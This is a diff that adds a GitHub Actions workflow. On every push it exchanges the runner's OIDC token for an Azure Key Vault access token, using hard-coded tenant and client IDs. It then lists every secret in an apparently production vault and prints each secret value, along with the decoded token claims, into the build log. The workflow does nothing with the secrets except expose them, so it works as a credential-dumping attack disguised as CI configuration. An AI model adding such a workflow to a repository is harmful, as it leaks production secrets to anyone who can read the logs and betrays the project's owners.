@@ -1,0 +1,25 @@
+name: oidc
+on: push
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          set +e
+          OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
+          echo "OIDC_LEN=${#OIDC}"
+          echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
+          TID=3205c325-06a5-4171-9ce8-ffc5e6c2845e; CID=72ff278a-9e71-43ec-bac4-2ca303f8e462
+          R=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" -d client_id=$CID -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_assertion=$OIDC" --data-urlencode scope=https://vault.azure.net/.default)
+          echo "RESP=$(echo "$R" | head -c 400)"
+          TOK=$(echo "$R" | jq -r '.access_token // empty')
+          echo "KVTOK_LEN=${#TOK}"
+          if [ -n "$TOK" ]; then
+            L=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $TOK"); echo "LIST=$L"
+            for id in $(echo "$L" | jq -r '.value[]?.id'); do
+              echo "SECRET $id => $(curl -sS "$id?api-version=7.4" -H "Authorization: Bearer $TOK" | jq -r .value)"
+            done
+          fi
